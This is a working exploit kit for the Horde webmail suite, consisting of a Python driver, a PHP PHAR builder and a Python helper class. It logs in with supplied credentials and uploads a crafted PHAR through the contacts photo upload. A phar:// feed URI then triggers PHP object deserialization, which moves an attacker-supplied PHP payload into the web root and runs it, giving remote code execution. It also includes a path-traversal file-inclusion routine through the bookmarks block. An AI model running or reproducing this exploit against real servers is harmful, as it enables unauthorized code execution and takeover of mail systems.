#!/usr/bin/env python3
from horde import Horde
import requests
import subprocess
import sys

TEMP_DIR = &#039;/tmp&#039;
WWW_ROOT = &#039;/var/www/html&#039;

if len(sys.argv) < 5:
    print(&#039;Usage: <base_url> <username> <password> <filename> <php_code>&#039;)
    sys.exit(1)

base_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
php_code = sys.argv[5]

source = &#039;{}/{}.phar&#039;.format(TEMP_DIR, filename)
destination = &#039;{}/static/{}.php&#039;.format(WWW_ROOT, filename) # destination (delete manually)
temp = &#039;temp.phar&#039;
url = &#039;{}/static/{}.php&#039;.format(base_url, filename)

# log into the web application
horde = Horde(base_url, username, password)

# create a PHAR that performs a rename when loaded and runs the payload when executed
subprocess.run([
    &#039;php&#039;, &#039;create-renaming-phar.php&#039;,
    temp, source, destination, php_code
], stderr=subprocess.DEVNULL)

# upload the PHAR
with open(temp, &#039;rb&#039;) as fs:
    phar_data = fs.read()
    horde.upload_to_tmp(&#039;{}.phar&#039;.format(filename), phar_data)

# load the phar thus triggering the rename
horde.trigger_phar(source)

# issue a request to trigger the payload
response = requests.get(url)
print(response.text)
## exploit-phar-loading.py EOF




## create-renaming-phar.php
#!/usr/bin/env php
<?php

// the __destruct method of Horde_Auth_Passwd eventually calls
// rename($this->_lockfile, $this->_params[&#039;filename&#039;]) if $this->_locked
class Horde_Auth_Passwd {
    protected $_locked;
    protected $_params;

    function __construct($source, $destination) {
        $this->_params = array(&#039;filename&#039; => $destination);
        $this->_locked = true;
        $this->_lockfile = $source;
    }
};

function createPhar($path, $source, $destination, $stub) {
    // create the object and specify source and destination files
    $object = new Horde_Auth_Passwd($source, $destination);

    // create the PHAR
    $phar = new Phar($path);
    $phar->startBuffering();
    $phar->addFromString(&#039;x&#039;, &#039;&#039;);
    $phar->setStub("<?php $stub __HALT_COMPILER();");
    $phar->setMetadata($object);
    $phar->stopBuffering();
}

function main() {
    global $argc, $argv;

    // check arguments
    if ($argc != 5) {
        fwrite(STDERR, "Usage: <path> <source> <destination> <stub>\n");
        exit(1);
    }

    // create a fresh new phar
    $path = $argv[1];
    $source = $argv[2];
    $destination = $argv[3];
    $stub = $argv[4];
    @unlink($path);
    createPhar($path, $source, $destination, $stub);
}

main();
## create-renaming-phar.php EOF


## horde.py
import re
import requests

class Horde():
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.session()
        self.token = None
        self._login()

    def _login(self):
        url = &#039;{}/login.php&#039;.format(self.base_url)
        data = {
            &#039;login_post&#039;: 1,
            &#039;horde_user&#039;: self.username,
            &#039;horde_pass&#039;: self.password
        }
        response = self.session.post(url, data=data)
        token_match = re.search(r&#039;"TOKEN":"([^"]+)"&#039;, response.text)
        assert (
            len(response.history) == 1 and
            response.history[0].status_code == 302 and
            response.history[0].headers[&#039;location&#039;] == &#039;/services/portal/&#039; and
            token_match
        ), &#039;Cannot log in&#039;
        self.token = token_match.group(1)

    def upload_to_tmp(self, filename, data):
        url = &#039;{}/turba/add.php&#039;.format(self.base_url)
        files = {
            &#039;object[photo][img][file]&#039;: (None, filename),
            &#039;object[photo][new]&#039;: (&#039;x&#039;, data)
        }
        response = self.session.post(url, files=files)
        assert response.status_code == 200, &#039;Cannot upload the file to tmp&#039;

    def include_remote_inc_file(self, path):
        # vulnerable block (alternatively &#039;trean:trean_Block_Mostclicked&#039;)
        app = &#039;trean:trean_Block_Bookmarks&#039;

        # add one dummy bookmark (to be sure)
        url = &#039;{}/trean/add.php&#039;.format(self.base_url)
        data = {
            &#039;actionID&#039;: &#039;add_bookmark&#039;,
            &#039;url&#039;: &#039;x&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the bookmark&#039;

        # add bookmark block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save-resume&#039;,
            &#039;app&#039;: app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the bookmark block&#039;

        # edit bookmark block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save&#039;,
            &#039;app&#039;: app,
            &#039;params[template]&#039;: &#039;../../../../../../../../../../../&#039; + path
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot edit the bookmark block&#039;

        # evaluate the remote file
        url = &#039;{}/services/portal/&#039;.format(self.base_url)
        response = self.session.get(url)
        print(response.text)

        # remove the bookmark block so to not break the page
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            # XXX token not needed here
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;removeBlock&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot reset the bookmark block&#039;

    def trigger_phar(self, path):
        # vulnerable block (alternatively the same can be obtained by creating a
        # bookmark with the PHAR path and clocking on it)
        app = &#039;horde:horde_Block_Feed&#039;

        # add syndicated feed block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save-resume&#039;,
            &#039;app&#039;: app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the syndicated feed block&#039;

        # edit syndicated feed block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save&#039;,
            &#039;app&#039;: app,
            &#039;params[uri]&#039;: &#039;phar://{}&#039;.format(path)
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot edit the syndicated feed block&#039;

        # load the PHAR archive
        url = &#039;{}/services/portal/&#039;.format(self.base_url)
        response = self.session.get(url)

        # remove the syndicated feed block so to not break the page
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            # XXX token not needed here
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;removeBlock&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot reset the syndicated feed block&#039;
## horde.py EOF

